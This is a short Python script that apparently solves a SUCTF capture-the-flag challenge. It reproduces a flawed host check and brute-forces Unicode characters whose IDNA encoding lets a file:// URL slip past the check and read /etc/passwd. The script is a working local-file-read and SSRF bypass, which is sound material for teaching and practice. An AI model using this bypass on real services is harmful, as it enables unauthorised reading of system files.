# tags: encoding

from urllib.parse import urlsplit, urlunsplit
from urllib import parse
import urllib.request

def getUrl(url):
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return False

    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return False

    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)

    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        try:
            finalUrl = finalUrl.replace('suctf.cc', 'localhost')
            urllib.request.urlopen(finalUrl, timeout=2)
            return True
        except:
            pass

    return False


url = 'file://suctf.cc'
path = '/etc/passwd'

for i in range(65536):
    try:
        c = chr(i)
        x = c.encode('idna').decode('utf-8')
        if c != x:
            newUrl = url.replace(x, c) + path
            if getUrl(newUrl):
                print(f'{i} "{c}" "{x}" \n{newUrl}\n')
    except:
        pass
